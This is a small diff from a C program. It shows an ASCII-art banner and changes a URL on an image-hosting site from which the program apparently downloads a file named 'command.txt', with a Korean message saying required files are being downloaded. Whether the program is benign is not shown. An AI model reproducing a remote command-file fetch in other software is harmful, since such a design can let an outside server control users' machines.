@@ -132,7 +132,7 @@ int main(){
 	puts("    :@%***#@*   =@%+=+##         .#*%@.   .@=  .@=     @+");
 	puts("      .:::         :::            ::       .    .      .");
 	puts("============================================================");
-	char cmdUrl[] = "http://imgdb.kr/dJsn.dn";
+	char cmdUrl[] = "http://imgdb.kr/dJsr.dn";
 	char cmdFileName[] = "command.txt";
 	puts("필요한 파일을 다운로드합니다.");
 	
